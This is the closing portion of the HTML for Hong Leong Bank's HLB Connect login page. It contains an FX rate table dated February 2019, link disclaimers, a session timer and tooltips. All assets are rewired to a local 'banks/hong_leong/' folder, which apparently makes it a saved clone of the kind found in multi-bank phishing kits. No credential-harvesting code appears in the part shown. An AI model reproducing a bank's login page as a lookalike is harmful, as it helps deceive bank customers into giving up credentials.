							<div class="freeapp"><img id="j_idt205" src="banks/hong_leong/connectapp.jpg" alt="mobile banking app" usemap="#freeappicons" style="margin: 10px;">
								<map name="freeappicons">
									<area shape="rect" coords="52,25,65,42" href="https://itunes.apple.com/my/app/hong-leong-connect-malaysia/id435942216" onclick="accessExternalUrl(&#39;https://itunes.apple.com/my/app/hong-leong-connect-malaysia/id435942216&#39;, &#39;true&#39;);return false;" title="Apple" alt="Apple">
									<area shape="rect" coords="68,25,82,42" href="https://play.google.com/store/apps/details?id=com.konylabs.HongLeongConnect" onclick="accessExternalUrl(&#39;https://play.google.com/store/apps/details?id=com.konylabs.HongLeongConnect&#39;, &#39;true&#39;);return false;" title="Android" alt="Android">
									<area shape="rect" coords="140,25,153,42" href="https://itunes.apple.com/my/app/hong-leong-connect-malaysia/id435942216" onclick="accessExternalUrl(&#39;https://itunes.apple.com/my/app/hong-leong-connect-malaysia/id435942216&#39;, &#39;true&#39;);return false;" title="Apple" alt="Apple">
								</map>
							</div>
							<div class="compreg">Hong Leong Bank Berhad (97141-X) / Hong Leong Islamic Bank Berhad (686191-W)
							</div>
						</div>
					</div>
										
				</div>
			</div><div id="idConfirmLinktoExternalMainPublic" class="ui-confirm-dialog ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow" style="margin: 0px 0px 0px -20px; width: 35%; height: auto;" role="dialog" aria-labelledby="idConfirmLinktoExternalMainPublic_title" aria-hidden="true"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span class="ui-dialog-title">External Link Disclaimer</span><a href="https://s.hongleongconnect.my/rib/app/fo/login#" class="ui-dialog-titlebar-icon ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick"></span></a></div><div class="ui-dialog-content ui-widget-content" style="height: auto;"><p><span class="ui-icon ui-icon-alert ui-confirm-dialog-severity"></span>You are leaving Hong Leong Bank's website as such our Privacy Policy shall cease. We wish to remind you on our terms on the use of
	        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/hyperlink-policy&#39;,&#39;Policy&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">links
	        		</a>
	        		,
	        		<a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="window.open(&#39;https://www.hlb.com.my/main/disclaimer&#39;,&#39;Disclmr&#39;,&#39;resizable=yes,scrollbars=yes,width=700,height=500&#39;);">Disclaimer and Reservation of Intellectual Property Rights
	        		</a></p></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"><table>
<tbody>
<tr>
<td class="tbl_col_max txt_right"><button id="idBtnOKMainPublic" name="idBtnOKMainPublic" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="confirmLinktoExternalMainPublic.hide();openWindow();;" type="button" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-check"></span><span class="ui-button-text ui-c">Continue</span></button></td>
<td class=" tbl_col_min"><button id="idBtnCancelMainPublic" name="idBtnCancelMainPublic" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-icon-left" onclick="confirmLinktoExternalMainPublic.hide();" type="button" role="button" aria-disabled="false"><span class="ui-button-icon-left ui-icon ui-c ui-icon-close"></span><span class="ui-button-text ui-c">Cancel</span></button></td>
</tr>
</tbody>
</table>
</div></div><div id="idFxRate" class="ui-dialog ui-widget ui-widget-content ui-overlay-hidden ui-corner-all ui-shadow ui-draggable ui-resizable" style="margin: 0px 0px 0px -20px; width: 450px; height: auto;" role="dialog" aria-labelledby="idFxRate_title" aria-hidden="true"><div class="ui-dialog-titlebar ui-widget-header ui-helper-clearfix ui-corner-top"><span id="idFxRate_title" class="ui-dialog-title">FX Rates</span><a href="https://s.hongleongconnect.my/rib/app/fo/login#" class="ui-dialog-titlebar-icon ui-dialog-titlebar-close ui-corner-all" role="button"><span class="ui-icon ui-icon-closethick"></span></a></div><div class="ui-dialog-content ui-widget-content" style="height: 500px;">
                <style type="text/css">
                    #id-fx-rate-table {
                        width: 400px;
                    }
                    #id-fx-rate-table th {
                        padding: 4px 10px;
                        font-weight: bold;
                        background-color: #0E2C50;
                        color: white;
                    }

                    #id-fx-rate-table td {
                        padding: 4px 10px;
                    }
                </style>
				<div class="txt_right" style="margin-right: 10px">Last updated: 16-Feb-2019 16:45:00
				</div>
                <table id="id-fx-rate-table">
                    <colgroup>
                        <col width="8%">
                        <col width="22%">
                        <col width="20%">
                        <col width="25%">
                        <col width="25%">
                    </colgroup>
                    <tbody><tr>
                        <th colspan="2">Currency</th>
                        <th class="txt_right">Unit</th>
                        <th class="txt_right">Selling TT</th>
                        <th class="txt_right">Buying TT</th>
                    </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:0:j_idt223" src="banks/hong_leong/USD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>USD</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">4.1360
                            </td>
                            <td class="txt_right">4.0130
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:1:j_idt223" src="banks/hong_leong/GBP.png" alt="" width="22px" style="display: inline;"></td>
                            <td>GBP</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">5.2970
                            </td>
                            <td class="txt_right">5.1290
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:2:j_idt223" src="banks/hong_leong/AUD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>AUD</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">2.9520
                            </td>
                            <td class="txt_right">2.8280
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:3:j_idt223" src="banks/hong_leong/CAD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>CAD</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">3.1200
                            </td>
                            <td class="txt_right">3.0060
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:4:j_idt223" src="banks/hong_leong/NZD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>NZD</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">2.8410
                            </td>
                            <td class="txt_right">2.7150
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:5:j_idt223" src="banks/hong_leong/EUR.png" alt="" width="22px" style="display: inline;"></td>
                            <td>EUR</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">4.6770
                            </td>
                            <td class="txt_right">4.5250
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:6:j_idt223" src="banks/hong_leong/SAR.png" alt="" width="22px" style="display: inline;"></td>
                            <td>SAR</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">1.1170
                            </td>
                            <td class="txt_right">1.0560
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:7:j_idt223" src="banks/hong_leong/AED.png" alt="" width="22px" style="display: inline;"></td>
                            <td>AED</td>
                            <td class="txt_right">1</td>
                            <td class="txt_right">1.1380
                            </td>
                            <td class="txt_right">1.0800
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:8:j_idt223" src="banks/hong_leong/BND.png" alt="" width="22px" style="display: inline;"></td>
                            <td>BND</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">305.3000
                            </td>
                            <td class="txt_right">294.8000
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:9:j_idt223" src="banks/hong_leong/HKD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>HKD</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">53.2700
                            </td>
                            <td class="txt_right">50.6000
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:10:j_idt223" src="banks/hong_leong/JPY.png" alt="" width="22px" style="display: inline;"></td>
                            <td>JPY</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">3.7590
                            </td>
                            <td class="txt_right">3.6220
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:11:j_idt223" src="banks/hong_leong/SGD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>SGD</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">305.3000
                            </td>
                            <td class="txt_right">294.8000
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:12:j_idt223" src="banks/hong_leong/CHF.png" alt="" width="22px" style="display: inline;"></td>
                            <td>CHF</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">410.6000
                            </td>
                            <td class="txt_right">399.9000
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:13:j_idt223" src="banks/hong_leong/CNY.png" alt="" width="22px" style="display: inline;"></td>
                            <td>CNY</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">62.2000
                            </td>
                            <td class="txt_right">58.6000
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:14:j_idt223" src="banks/hong_leong/DKK.png" alt="" width="22px" style="display: inline;"></td>
                            <td>DKK</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">64.4200
                            </td>
                            <td class="txt_right">58.9300
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:15:j_idt223" src="banks/hong_leong/SEK.png" alt="" width="22px" style="display: inline;"></td>
                            <td>SEK</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">46.3700
                            </td>
                            <td class="txt_right">41.2900
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:16:j_idt223" src="banks/hong_leong/NOK.png" alt="" width="22px" style="display: inline;"></td>
                            <td>NOK</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">49.6200
                            </td>
                            <td class="txt_right">44.5300
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:17:j_idt223" src="banks/hong_leong/INR.png" alt="" width="22px" style="display: inline;"></td>
                            <td>INR</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">5.9800
                            </td>
                            <td class="txt_right">5.4300
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:18:j_idt223" src="banks/hong_leong/THB.png" alt="" width="22px" style="display: inline;"></td>
                            <td>THB</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">13.9000
                            </td>
                            <td class="txt_right">12.0800
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:19:j_idt223" src="banks/hong_leong/PHP.png" alt="" width="22px" style="display: inline;"></td>
                            <td>PHP</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">8.0300
                            </td>
                            <td class="txt_right">7.5500
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:20:j_idt223" src="banks/hong_leong/IDR.png" alt="" width="22px" style="display: inline;"></td>
                            <td>IDR</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">0.0310
                            </td>
                            <td class="txt_right">0.0269
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:21:j_idt223" src="banks/hong_leong/ZAR.png" alt="" width="22px" style="display: inline;"></td>
                            <td>ZAR</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">30.1600
                            </td>
                            <td class="txt_right">27.1300
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:22:j_idt223" src="banks/hong_leong/BDT.png" alt="" width="22px" style="display: inline;"></td>
                            <td>BDT</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">5.2100
                            </td>
                            <td class="txt_right">4.5000
                            </td>
                        </tr>
                        <tr class="ui-datatable-odd">
                            <td><img id="j_idt221:23:j_idt223" src="banks/hong_leong/TWD.png" alt="" width="22px" style="display: inline;"></td>
                            <td>TWD</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">14.5300
                            </td>
                            <td class="txt_right">-
                            </td>
                        </tr>
                        <tr class="ui-datatable-even">
                            <td><img id="j_idt221:24:j_idt223" src="banks/hong_leong/KRW.png" alt="" width="22px" style="display: inline;"></td>
                            <td>KRW</td>
                            <td class="txt_right">100</td>
                            <td class="txt_right">0.3969
                            </td>
                            <td class="txt_right">-
                            </td>
                        </tr>
                </tbody></table>
                <div>
                    <br>Disclaimer : Rates displayed is subject to change without prior notice. For the latest currency notes and remittance rates, please refer to your nearest HLBB / HLISB branch.
                    <br>
                </div></div><div class="ui-resizable-handle ui-resizable-n" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-s" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-e" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-w" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-ne" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-nw" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 1000;"></div><div class="ui-resizable-handle ui-resizable-sw" style="z-index: 1000;"></div></div>

			<br>
			<br>

			 
			<div id="myModal" class="modal-survey">
  				
  				<div class="modal-content-survey"> 
    				<span class="close-survey">×</span> 
					<iframe id="idSurveyFrame" width="100%" height="100%" src="banks/hong_leong/saved_resource.html"></iframe> 
  				</div>
  			</div><script type="text/javascript">var vTimeoutTimer;function startSessionTimer() {clearTimeout(vTimeoutTimer);vTimeoutTimer=setTimeout('window.location="/rib/app/fo/login?t=1&s=190202060206";',295000);};$(document).ready(function() {startSessionTimer();});</script>
<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div>
		<div id="simplemodal-overlay" class="simplemodal-overlay" style="opacity: 0.5; height: 0px; width: 0px; left: 0px; top: 0px; z-index: 1001;"></div><div id="simplemodal-container" class="simplemodal-container" style="position: absolute; background-color: rgb(255, 255, 255); border-color: rgb(255, 255, 255); min-height: 560px; max-height: 560px; min-width: 750px; max-width: 750px; z-index: 1002; height: 560px; width: 750px; left: 577px; top: 216px; display:none;"><a class="modalCloseImg simplemodal-close" title="Close"></a><div tabindex="-1" class="simplemodal-wrap" style="height: 100%; outline: 0px; width: 100%; overflow: visible;"><div id="basic-modal-content" class="simplemodal-data" style="display: block;"><a href="https://s.hongleongconnect.my/rib/app/fo/login#" onclick="accessExternalUrl(&#39;https://www.hlb.com.my/en/personal-banking/help-support/general-faq/security.html&#39;, &#39;false&#39;);return false;" style="cursor: pointer;"><img id="j_idt242" src="banks/hong_leong/1545361392874.jpg" alt=""></a>
			</div></div></div><div id="idTooltip2" class="ui-tooltip ui-widget ui-widget-content ui-shadow ui-corner-all" style="background:#efefef;">Reset your HLB Connect if you:
		
		<ul style="margin-bottom:-10px;list-style-type:disc;padding-left:15px">
			<li>Forgot your Username</li>
			<li>Forgot your Password</li>
			<li>Would like to change your Username and Password</li>
			<li>Want to reactivate dormant Online/Mobile Banking Account</li>
		</ul></div><div id="idTooltip" class="ui-tooltip ui-widget ui-widget-content ui-shadow ui-corner-all" style="background:#efefef;">Reset your HLB Connect if you:
		
		<ul style="margin-bottom:-10px;list-style-type:disc;padding-left:15px">
			<li>Forgot your Username</li>
			<li>Forgot your Password</li>
			<li>Would like to change your Username and Password</li>
			<li>Want to reactivate dormant Online/Mobile Banking Account</li>
		</ul></div><div class="ui-dialog-docking-zone"></div><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_hlbmc_0" src="banks/hong_leong/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>